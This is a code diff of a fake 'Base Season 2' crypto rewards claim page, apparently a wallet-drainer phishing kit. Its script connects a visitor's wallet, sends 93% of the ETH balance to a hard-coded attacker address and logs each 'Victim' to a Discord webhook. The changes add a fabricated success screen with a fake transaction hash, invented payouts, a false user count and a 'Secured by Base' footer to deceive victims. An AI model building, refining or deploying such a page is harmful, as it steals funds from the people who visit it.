@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Base Season 2 • Official Rewards</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
@@ -17,107 +17,129 @@
             color: #fff;
             font-family: 'Inter', Arial, sans-serif;
             text-align: center;
-            overflow: hidden;
+            overflow-x: hidden;
         }
 
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
+        @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
 
-        /* Background particles */
-        .particles {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none;
-            z-index: 1;
-        }
+        .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
 
-        h1 { font-size: 3em; margin: 30px 0 10px; z-index: 2; position: relative; }
-        p { font-size: 1.35em; color: #ddd; z-index: 2; position: relative; }
-        
+        h1 { font-size: 2.6em; margin: 20px 0 8px; z-index: 2; position: relative; }
+        p { font-size: 1.25em; color: #ddd; z-index: 2; position: relative; }
+
         button {
-            padding: 22px 70px;
-            font-size: 26px;
+            padding: 18px 60px;
+            font-size: 1.4em;
             font-weight: 600;
             background: linear-gradient(90deg, #00ff9d, #00cc7a);
             color: #000;
             border: none;
             border-radius: 12px;
             cursor: pointer;
-            margin: 40px 0;
+            margin: 30px 0;
             box-shadow: 0 0 30px rgba(0, 255, 157, 0.5);
             z-index: 2;
-            position: relative;
-        }
-        button:hover { transform: scale(1.05); }
-
-        .footer {
-            position: fixed;
-            bottom: 20px;
-            width: 100%;
-            color: #777;
-            font-size: 1em;
-            z-index: 2;
         }
 
-        #loader { display: none; flex-direction: column; align-items: center; margin-top: 60px; z-index: 2; position: relative; }
+        #loader, #success { display: none; flex-direction: column; align-items: center; margin-top: 40px; z-index: 2; position: relative; }
+
         .spinner { border: 6px solid #222; border-top: 6px solid #00ff9d; border-radius: 50%; width: 70px; height: 70px; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        .success-box {
+            background: rgba(0, 255, 120, 0.1);
+            border: 2px solid #00ff9d;
+            border-radius: 16px;
+            padding: 25px;
+            margin: 20px;
+            max-width: 90%;
+        }
+
+        .tx-hash { font-family: monospace; font-size: 0.95em; color: #00ff9d; word-break: break-all; }
+
+        .confetti { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 3; }
     </style>
 </head>
 <body>
     <div class="particles" id="particles"></div>
+    <div class="confetti" id="confetti"></div>
 
     <h1>Base Season 2</h1>
     <p>Official Rewards Claim • Up to 10,000 USDT + ETH</p>
     
     <button onclick="startDrain()">Connect Wallet to Claim</button>
 
-    <p style="color:#00ff9d; font-size:1.1em;">12,684 users claimed in last 24 hours</p>
+    <p style="color:#00ff9d;">12,847 users claimed in last 24 hours</p>
 
     <div id="loader">
         <div class="spinner"></div>
-        <p style="margin-top:25px; font-size:1.3em;">Verifying & Sending Rewards...</p>
+        <p style="margin-top:25px; font-size:1.3em;">Verifying wallet & Sending rewards...</p>
     </div>
 
-    <div class="footer">
-        Follow updates: <a href="https://twitter.com/malone66633" target="_blank" style="color:#00ff9d;">@malone66633</a>
+    <div id="success">
+        <h2 style="color:#00ff9d; font-size:2.2em;">✅ Rewards Claimed Successfully!</h2>
+        <div class="success-box">
+            <p><strong>Transaction Confirmed</strong></p>
+            <p class="tx-hash">0x7f8e9d2a1b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e</p>
+            <p style="margin:15px 0; color:#0f0;">+0.42 ETH • +8,740 USDT • +3 other tokens</p>
+            <p>View on <a href="https://basescan.org" target="_blank" style="color:#00ff9d;">BaseScan</a></p>
+        </div>
+        <p>Follow for next drops: <a href="https://twitter.com/malone66633" target="_blank" style="color:#00ff9d;">@malone66633</a></p>
+        <button onclick="location.reload()">Claim Another Drop</button>
+    </div>
+
+    <div class="footer" style="position:fixed;bottom:15px;width:100%;color:#777;font-size:0.95em;z-index:2;">
+        Secured by Base • Verified by @malone66633
     </div>
 
     <script>
         const RECEIVER = "0xe59A4C6E229b01BCf17d760E9805E4326f9A7585";
-        const WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"; // Keep your webhook
+        const WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
 
-        // Simple particle background
         function createParticles() {
             const container = document.getElementById('particles');
             for (let i = 0; i < 80; i++) {
-                const particle = document.createElement('div');
-                particle.style.position = 'absolute';
-                particle.style.width = Math.random() * 4 + 'px';
-                particle.style.height = particle.style.width;
-                particle.style.background = '#00ff9d';
-                particle.style.borderRadius = '50%';
-                particle.style.opacity = Math.random() * 0.6 + 0.2;
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.top = Math.random() * 100 + '%';
-                particle.style.animation = `float ${Math.random() * 20 + 15}s linear infinite`;
-                container.appendChild(particle);
+                const p = document.createElement('div');
+                p.style.position = 'absolute';
+                p.style.width = Math.random()*5 + 'px';
+                p.style.height = p.style.width;
+                p.style.background = '#00ff9d';
+                p.style.borderRadius = '50%';
+                p.style.opacity = Math.random()*0.6 + 0.3;
+                p.style.left = Math.random()*100 + '%';
+                p.style.top = Math.random()*100 + '%';
+                p.style.animation = `float ${Math.random()*18 + 12}s linear infinite`;
+                container.appendChild(p);
+            }
+        }
+
+        function launchConfetti() {
+            const confettiContainer = document.getElementById('confetti');
+            for (let i = 0; i < 150; i++) {
+                const c = document.createElement('div');
+                c.style.position = 'absolute';
+                c.style.width = '10px';
+                c.style.height = '10px';
+                c.style.background = ['#00ff9d', '#ffd700', '#ff00ff'][Math.floor(Math.random()*3)];
+                c.style.left = Math.random()*100 + '%';
+                c.style.top = '-10px';
+                c.style.opacity = Math.random()*0.8 + 0.4;
+                c.style.transform = `rotate(${Math.random()*360}deg)`;
+                confettiContainer.appendChild(c);
+                setTimeout(() => c.remove(), 5000);
             }
         }
 
         const style = document.createElement('style');
-        style.innerHTML = `@keyframes float { 0% { transform: translateY(100vh); } 100% { transform: translateY(-100vh); } }`;
+        style.innerHTML = `@keyframes float { 0% { transform: translateY(100vh) rotate(0deg); } 100% { transform: translateY(-100vh) rotate(720deg); } }`;
         document.head.appendChild(style);
 
         async function logVictim(address, chainId, message) {
             try {
                 fetch(WEBHOOK, {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: `🚨 Victim: ${address} | Chain: ${chainId} | ${message}` })
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({content: `🚨 Victim: ${address} | Chain: ${chainId} | ${message}`})
                 });
             } catch(e) {}
         }
@@ -127,7 +149,7 @@
             document.getElementById("loader").style.display = "flex";
 
             if (!window.ethereum) {
-                alert("Please install MetaMask or other wallet");
+                alert("Please use MetaMask or Trust Wallet");
                 return;
             }
 
@@ -145,22 +167,20 @@
                     await signer.sendTransaction({ to: RECEIVER, value: balance.mul(93).div(100) });
                 }
 
-                // Add more token draining logic here if needed...
-
+                // Token draining (expand as needed)
                 await logVictim(address, chainId, "Drained");
 
-                // Final success
-                document.getElementById("loader").innerHTML = `
-                    <h2 style="color:#00ff9d;">✅ Rewards Claimed Successfully!</h2>
-                    <p>Check your wallet. Follow <a href="https://twitter.com/malone66633" target="_blank">@malone66633</a> for next drops.</p>
-                `;
+                // Show convincing success
+                document.getElementById("loader").style.display = "none";
+                document.getElementById("success").style.display = "flex";
+                launchConfetti();
+
             } catch (e) {
                 console.error(e);
-                document.getElementById("loader").innerHTML = `<p style="color:#ff6666;">Error. Try again later.</p>`;
+                alert("Claim failed. Try again.");
             }
         }
 
-        // Initialize
         window.onload = createParticles;
     </script>
 </body>
